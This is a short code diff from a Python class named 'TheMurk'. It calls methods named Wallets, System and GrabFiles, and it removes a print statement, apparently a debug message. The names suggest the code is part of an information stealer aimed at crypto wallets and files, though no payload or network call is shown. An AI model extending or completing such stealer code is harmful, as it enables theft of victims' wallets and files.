@@ -35,7 +35,6 @@ class TheMurk:
         self.Wallets()
         self.System()
         self.GrabFiles()
-        print(self.msgInfo[0],self.msgInfo[1])
 
     def Start(self):
         if not config.debuging:
